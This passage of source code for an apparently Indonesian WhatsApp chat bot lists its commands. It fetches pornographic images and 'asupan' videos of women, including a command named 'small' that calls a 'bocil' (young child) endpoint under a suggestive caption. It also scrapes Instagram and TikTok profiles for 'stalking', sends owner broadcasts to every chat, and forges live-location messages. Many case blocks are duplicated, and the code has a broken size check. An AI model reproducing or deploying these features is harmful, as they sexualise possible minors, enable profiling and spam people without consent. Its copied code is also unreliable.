            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`;
          }
          reply(res);
        });
        break;
     /* case "igstalk":
        if (!q) return reply("Usernamenya?");
        const tod = await fetchJson(
          `https://api.dhnjing.xyz/stalk/instagram?user=${q}`
        );
        buff = await getBuffer(tod.result.user_profile_hd);
        const tt = `*INSTAGRAM STALK*
    Username: ${tod.result.username}
    Fullname: ${tod.result.user_fullname}
    Bio: ${tod.result.user_bio}

    Jumlah postingan: ${tod.result.user_post_total}
    Following: ${tod.result.user_following}
    Follower: ${tod.result.user_followers}`;
        ALIYABOT.sendMessage(from, buff, image, { quoted: mek, caption: tt });
        break;*/
        case 'intakemenu':
 
 listMsg = {
 buttonText: 'INTAKE LIST',
 footerText: 'asu sangean',
 description: `select the intake menu here, use it wisely`,
 sections: [
                     {
                      "title": `Doge Bot`,
 rows: [
                          {
                             "title": "randomgirl",
                              "rowId": ""
                          },
                          {
                              "title": "vietnamesegirl",
                              "rowId": ""
                           },
                          {
                              "title": "hijabgirl",
                              "rowId": ""
                           },
                           {
                              "title": "santuy",
                              "rowId": ""
                           },
                           {
                              "title": "brosis",
                              "rowId": ""
                           },
                           {
                              "title": "small",
                              "rowId": ""
                           },
                           {
                              "title": "ghea",
                              "rowId": ""
                           },
                           {
                              "title": "rika",
                              "rowId": ""
                           },
                           {
                              "title": "ListMenu",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
ALIYABOT.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [sender]},quoted:mek})
break
 //━━━━━━━━━━━━━━━[ BAHAN ASUPAN ]━━━━━━━━━━━━━━━━━//

case 'randomgirl':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/cecan?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
ALIYABOT.sendMessage(from, buffer, image, {quoted: fvid, caption: 'Here is a random girl🗿'})
break
case 'hijabgirl':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/hijaber?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
ALIYABOT.sendMessage(from, buffer, image, {quoted: fvid, caption: 'Here, dont stand up, okay? (≧▽≦)'})
break
case 'santuy':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/santuy?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
ALIYABOT.sendMessage(from, buffer, video, {quoted: fvid, caption: 'Here, dont stand up, okay? (≧▽≦)'})
break
case 'brosis':

ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/ukty?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
ALIYABOT.sendMessage(from, buffer, video, {quoted: fvid, caption: 'Here, dont stand up, okay? (≧▽≦)'})
break
case 'small':

ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/bocil?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
ALIYABOT.sendMessage(from, buffer, video, {quoted: fvid, caption: 'Here, dont stand up, okay? (≧▽≦)'})
break
case 'ghea':

ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/ghea?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
ALIYABOT.sendMessage(from, buffer, video, {quoted: fvid, caption: 'Here, dont stand up, okay? (≧▽≦)'})
break
case 'rika':

ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/rikagusriani?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
ALIYABOT.sendMessage(from, buffer, video, {quoted: fvid, caption: 'Here, dont stand up, okay? (≧▽≦)'})
break
      case 'vietnamesegirl':
huft = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/cewe/vietnam?apikey=${zerkey}`)
reply(mess.wait)
goo = await getBuffer(huft.result.url)
ALIYABOT.sendMessage(from, goo, image, {quoted: fvid, caption: 'Here is a Vietnamese Girl🗿'})
break
      case 'tiktokstalk':
             if (args.length == 0) return fakegroup(`Example: ${prefix + command} marz.hiatus`)
             reply(mess.wait)
             stalk_toktok = args[0]
             get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/stalktiktok/${stalk_toktok}?apikey=}`)
             get_result = get_result.result
             pp_tt = await getBuffer(get_result.user_picture)
             ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *TIKTOK PROFILE*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`き⃟🦈 Username : ${get_result.username}\`\`\`
\`\`\`き⃟🦈 Nama : ${get_result.nickname}\`\`\`
\`\`\`き⃟🦈 Pengikut : ${get_result.followers}\`\`\`
\`\`\`き⃟🦈 Mengikuti : ${get_result.followings}\`\`\`
\`\`\`き⃟🦈 Likes : ${get_result.likes}\`\`\`
\`\`\`き⃟🦈 Video : ${get_result.video}\`\`\`
\`\`\`き⃟🦈 Deskripsi : ${get_result.bio}\`\`\`
`
              ALIYABOT.sendMessage(from, pp_tt, image, { quoted: mek, caption: ini_txt, thumbnail: Buffer.alloc(0) })
              break
   
  case 'nulisbuku':            
            if (args.length == 0) return reply(`contoh: ${prefix + command} Vall`)
            reply(mess.wait)
            teks = args.join(" ")
            ini_buf = await getBuffer(`https://ALIYABOT.herokuapp.com/api/maker/nulis?apikey=${valkey}&text=${teks}`)  
buttons = [{buttonId: `${prefix}listnulis`,buttonText:{displayText: `List Nulis🔖`},type:1}]
              imageMsg = (await ALIYABOT.prepareMessageMedia(ini_buf, "imageMessage", { thumbnail: ini_buf, })).imageMessage
              buttonsMessage = {footerText:'𝘊𝘳𝘦𝘢𝘵𝘦𝘥 𝘉𝘺 Alya✓Chan︎', imageMessage: imageMsg,
              contentText:`𝙅𝙖𝙣𝙜𝙖𝙣 𝙇𝙪𝙥𝙖 𝙁𝙤𝙡𝙡𝙤𝙬 𝙄𝙜 @_𝙞𝙩𝙨𝙢𝙚𝙫𝙖𝙡𝙡 ☹︎`,buttons,headerType:4}
              prep = await ALIYABOT.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              ALIYABOT.relayWAMessage(prep)
         
            break
		case 'nulis':
              
                if (args.length < 1) return grupinv(`teksnya mana bruh?\ncontoh ${prefix + command} ${pushname}`)
                dpuhy = args.join(' ')
               tiyo = `SILAHKAN PILIH SALAH SATU`
sendButMessage(from, tiyo, `𝘊𝘳𝘦𝘢𝘵𝘦𝘥 𝘉𝘺 Alya✓Chan︎`, [
            {              
              buttonId: `${prefix}nuliskanan ${dpuhy}`,
              buttonText: {
                displayText: `KANAN`,
              },
              type: 1,
               },
          {
            buttonId: `${prefix}nuliskiri ${dpuhy}`,
            buttonText: {
              displayText: `KIRI`,
            },
            type: 1,          
          },
        ]);               
        break;
        // Photo Oxy //
                case 'shadow':
                case 'cup':
                case 'cup1':
                case 'romance':
                case 'smoke':
                case 'burnpaper':
                case 'lovemessage':
                case 'undergrass':
                case 'love':
                case 'coffe':
                case 'woodheart':
                case 'woodenboard':
                case 'summer3d':
                case 'wolfmetal':
                case 'nature3d':
                case 'underwater':
                case 'golderrose':
                case 'summernature':
                case 'letterleaves':
                case 'glowingneon':
                case 'fallleaves':
                case 'flamming':
                case 'harrypotter':
                case 'carvedwood':
                reply (mess.wait)
                    if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                    ini_txt = args.join(" ")
                  buff = await getBuffer(`https://api.lolhuman.xyz/api/photooxy1/${command}?apikey=${setting.lolkey}&text=${ini_txt}`)
                          buttons = [{buttonId: `!menu`,buttonText:{displayText: `BACK MENU`},type:1}]
              imageMsg = (await ALIYABOT.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'ℎ𝑒𝑟𝑚𝑎𝑛 𝐵𝑜𝑡𝑧☕T', imageMessage: imageMsg,
              contentText:`Jangan Lupa Follow @cal_me_herman`,buttons,headerType:4}
              prep = await ALIYABOT.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              ALIYABOT.relayWAMessage(prep)
        
                    break
                    case 'bc2':
             if (!isOwner && !mek.key.fromMe) return  reply(mess.only.owner)
             if (args.length < 1) return reply('teks?')
             anu100 = await ALIYABOT.chats.all()
             if (isMedia && !ALIYABOT.message.videoMessage || isQuotedImage) {
             const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(ALIYABOT).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ALIYABOT
             bc100 = await ALIYABOT.downloadMediaMessage(encmedia)
             for (let _ of anu100) {
             ALIYABOT.sendMessage(_.jid, bc100, image, {quoted: freply, caption: `*「 PESAN SIARAN BOT 」*\n\n${body.slice(4)}`})
}
             reply('Suksess broadcast')
             } else {
             for (let _ of anu100) {
             ALIYABOT.sendMessage(_.jid, 
			{"contentText": `*「 PESAN SIARAN BOT 」*\n\n${body.slice(4)}`,
			"footerText": '*_BROADCAST_*',
			"buttons": [
			{"buttonId": `#owner`,
			"buttonText": {"displayText": "OWNER"
			},"type": "RESPONSE"}
			], "headerType": 'LOCATION',
			locationMessage: { degreesLatitude: '',
			degreesLongitude: '',
			jpegThumbnail: fakeimage,
			}}, MessageType.buttonsMessage )
}
             reply('Suksess broadcast')
}
             break         
   case 'bc':
					ALIYABOT.updatePresence(from, Presence.composing)
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					if (args.length < 1) return reply('Teksnya?')
					anu = await ALIYABOT.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await ALIYABOT.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							ALIYABOT.sendMessage(_.jid, buff, image, { viewOnce:true, caption: `${body.slice(4)}`})
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await ALIYABOT.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							ALIYABOT.sendMessage(_.jid, buff, video, { viewOnce:true, caption: `${body.slice(4)}`})
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await ALIYABOT.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							ALIYABOT.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: finv, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `${body.slice(4)}` })
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `${body.slice(4)}`)
						}
						reply(`Sukses mengirim Broadcast:\n${body.slice(4)}`)
					}
					break

case 'get':
          case 'fetch': //ambil dari nuru
              if (!/^https?:\/\//.test(q)) return reply('Awali *URL* dengan http:// atau https://')
              res = await fetch(q)
              if (res.headers.get('content-length') > 100 * 1024 * 1024 * 1024) {
              delete res
              throw `Content-Length: ${res.headers.get('content-length')}`
}
              if (!/text|json/.test(res.headers.get('content-type'))) return sendMediaURL(from, q)
              txtx = await res.buffer()
              try {
              txtx = util.format(JSON.parse(txtx+''))
              } catch (e) {
              txtx = txtx + ''
              } finally {
              reply(txtx.slice(0, 65536) + '')
}
              break
              case 'sharelock':
if (!arg) return reply(`Contoh Penggunaan ${prefix}sharelock Text`)
kntl = `${args.join(' ')}`
nama = kntl.split("|")[0];
impostor = kntl.split("|")[1];
ALIYABOT.sendMessage(from, {
name: nama,
address: impostor,
jpegThumbnail: fakeimage}, MessageType.liveLocation, {quoted:ftokoo})
break
case 'qrcode':
if (!c) return reply('Textnya mana gan? contoh .qrcode ALIYABOT')
reply(mess.wait)
anu = (`https://bx-hunter.herokuapp.com/api/qrcode?text=${c}&apikey=${HunterApi}`)
img = await getBuffer(anu)
ALIYABOT.sendMessage(from, img, image, { quoted: mek, thumbnail: fs.readFileSync('./stik/oksip.jpeg')})
break
             case 'valorantbanner':
if (args.length == 0) return reply(`Teks Nya Mana ?\nContoh : ${prefix + command} Zero YT7`)
bo = args.join(" ")
reply(mess.wait)
anu = await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${apikey1}&text=${bo}`)
ALIYABOT.sendMessage(from, anu, image, {quoted: ftrol, caption: 'Done ' })
break
case "anal":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                ALIYABOT.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;        
      case "anime":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                ALIYABOT.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
case "lesbian":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                ALIYABOT.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
      case "anime":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                ALIYABOT.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
case "eroneko":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                ALIYABOT.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
      case "anime":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                ALIYABOT.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
case "bj":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                ALIYABOT.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
      case "anime":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                ALIYABOT.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
case "kitsune":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                ALIYABOT.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
      case "anime":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                ALIYABOT.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
case "pussy":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                ALIYABOT.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
      case "anime":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                ALIYABOT.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
case "wallpaper":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                ALIYABOT.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
      case "anime":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                ALIYABOT.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
case "neko2":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                ALIYABOT.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
      case "anime":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                ALIYABOT.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
case "baka":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                ALIYABOT.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
      case "anime":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                ALIYABOT.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
case "slap":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                ALIYABOT.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
      case "anime":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                ALIYABOT.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
case "poke":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                ALIYABOT.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
      case "anime":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                ALIYABOT.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
case "keta":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                ALIYABOT.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
      case "anime":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                ALIYABOT.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
case  'awoo':
if (isBanned) return reply(mess.ban)
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/sfw/awoo`)
buffer = await getBuffer(anu.url)
ALIYABOT.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./alya.jpg')})
break
case  'blowjob':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
anu = await fetchJson(`https://nekos.life/api/v2/img/blowjob`)
buffer = await getBuffer(anu.url)
ALIYABOT.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./alya.jpg')})
break
case  'hentai': 
if (isBanned) return reply(mess.ban)
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/nsfw/neko`)
buffer = await getBuffer(anu.url)
ALIYABOT.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./alya.jpg')})
break
case  'megumin2':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (!isGroup) return reply('this feature is only for groups')
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/sfw/megumin`)
buffer = await getBuffer(anu.url)
ALIYABOT.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./nsfwdoge.jpg')})
break
case  'megumin':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/sfw/megumin`)
buffer = await getBuffer(anu.url)
ALIYABOT.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./alya.jpg')})
break
case 'neko':
if (isBanned) return reply(mess.ban)
               if (!isRegistered) return reply (mess.banned)
               reply(mess.wait)
                buffer = await getBuffer(`https://api.dhamzxploit.my.id/api/nsfw/neko`)
                const bbc = await ALIYABOT.prepareMessage(from, buffer, MessageType.image)

            const button = [{buttonId:`${prefix}neko`,buttonText: {displayText: 'Next️'}, type: 1}]

            const ButonMessages = {

            contentText: `_© By Alya✓Chan_`,

            buttons: button,

            footerText: `Klik Next Untuk Melanjutkan`,

            headerType: 4,

            imageMessage: bbc.message.imageMessage

            }

            await ALIYABOT.sendMessage(from, ButonMessages, MessageType.buttonsMessage, {quoted :mek})
                break
case  'trapnime':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/nsfw/trap`)
buffer = await getBuffer(anu.url)
ALIYABOT.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./alya.jpg')})
break
//Done
				case 'nuliskiri':
               if (args.length < 1) return reply('Yang mau di tulis apaan?')
               teks = args.join(' ')
               reply(mess.wait)
               nulis = encodeURIComponent(teks)
               res = await axios.get(`https://dt-04.herokuapp.com/nulis?text=${nulis}`)
               if (res.data.error) return reply(res.data.error)
               buff = Buffer.from(res.data.result.split(',')[1], 'base64')
               ALIYABOT.sendMessage(from, buff, image, {quoted: mek, caption: mess.success}).catch(e => {
               return reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim File_')
})
               break
						case 'nuliskanan':
               if (args.length < 1) return fakegroup('Yang mau di tulis apaan?')
               teks = args.join(' ')
               reply(mess.wait)
               nulis = encodeURIComponent(teks)
               res = await axios.get(`https://dt-04.herokuapp.com/nulis?text=${nulis}`)
               if (res.data.error) return reply(res.data.error)
               buff = Buffer.from(res.data.result.split(',')[1], 'base64')
               ALIYABOT.sendMessage(from, buff, image, {quoted: mek, caption: mess.success}).catch(e => {
               return reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim File_')
})
               break             
               case 'youtube':
  
  
             if (args.length < 1) return reply('Link Nya Mana?')
             if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
             teks = args.join(' ')
             res = await y2mateA(teks).catch(e => {
             reply('_[ ! ] Error Gagal Dalam Memasuki Web Y2mate_')
})
             result = `*Youtube Downloader*
             
